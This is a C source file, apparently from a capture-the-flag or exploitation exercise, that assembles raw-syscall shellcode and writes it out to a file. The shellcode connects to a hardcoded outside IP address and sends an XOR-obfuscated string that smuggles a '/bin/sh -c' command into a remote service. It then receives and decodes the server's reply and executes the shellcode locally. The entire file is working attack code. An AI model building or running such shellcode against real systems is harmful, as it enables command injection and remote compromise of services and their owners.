#include <stdint.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>

void shellcode (void) {
    int sock = 0;
/*
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        return -2;
    }
*/
    __asm ("movl $41, %%eax;"
           "movl $0, %%edx;"
           "movl $1, %%esi;"
           "movl $2, %%edi;"
           "syscall;"
           "movl %%eax, %0;"
          :"=r"(sock)
          :
          :);
    if (sock < 0) return -2;


    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = 0xb80b; //port 3000
    addr.sin_addr.s_addr = 0x9094c954; //84.201.148.144
/*
    if (connect(sock, (struct sockaddr *)(&addr), sizeof(addr)) != 0)
    {
        return -3;
    }
*/
    int res = 0;
    __asm ("xorq %%rdi, %%rdi;"
           "movl %1, %%edi;"
           "movq %2, %%rsi;"
           "movq %3, %%rdx;"
           "movl $42, %%eax;"
           "syscall;"
           "movl %%eax, %0;"
          :"=r" (res)
          :"g"(sock), "g"((uint64_t)(&addr)), "g"(sizeof(addr))
          :);
    if (res != 0) return -3;

    char this_magic_string[] = "AAAAAAAA; /bin/sh -c 'echo \"im pwned\" >> pwned_list;'"; //AAAAAAAA is replaced to OTP by server
    int this_magic_string_size = 53;
    for (int i = 0; i < this_magic_string_size; i++) this_magic_string[i] ^= 0x97;
    __asm ("movq %[buf], %%rsi;"
           "movq %[sock], %%rdi;"
           "movq %[len], %%rdx;"
           "xorq %%r10, %%r10;"
           "movq %[sockaddr], %%r8;"
           "movq %[ptrlen], %%r9;"
           "movq $44, %%rax;" //sendto
           "syscall;"
          :
          :[buf] "g"(this_magic_string), [sock] "g"(sock), [len] "g"(this_magic_string_size),
           [sockaddr] "r"((uint64_t)(&addr)), [ptrlen] "g"(sizeof(addr))
          :);
    
    const size_t server_answer_size = 1024;
    char server_answer[server_answer_size];
    size_t p = sizeof(addr);
    
    __asm ("movq %[buf], %%rsi;"
           "movq %[sock], %%rdi;"
           "movq %[len], %%rdx;"
           "xorq %%r10, %%r10;"
           "movq %[sockaddr], %%r8;"
           "movq %[ptrlen], %%r9;"
           "movq $45, %%rax;" //recvfrom
           "syscall;"
          :
          :[buf] "g"(server_answer), [sock] "g"(sock), [len] "g"(server_answer_size),
           [sockaddr] "r"((uint64_t)(&addr)), [ptrlen] "g"(&p)
          :);

    for (int i = 0; i < server_answer_size; i++) server_answer[i] ^= 0x79;
    __asm ("movq $2, %%rdi;"
           "movq %[buf], %%rsi;"
           "xorq %%rdx, %%rdx;"
           "movq %[len], %%rdx;"
           "movq $1, %%rax;"
           "syscall;"
           :
           :[buf] "g"(server_answer), [len] "g"(server_answer_size)
           :);
}

void end_shellcode (void) { }

int main () {
    uint64_t shellcode_len = (uint64_t)end_shellcode - (uint64_t)shellcode;
    printf("shellcode len: %lu bytes\n", shellcode_len);
    FILE* fout = fopen("./shellcode.out", "w");
    fwrite((void*)shellcode, shellcode_len, 1, fout);
    fclose(fout);
    puts("calling shellcode()");
    shellcode();
    return 0;
}

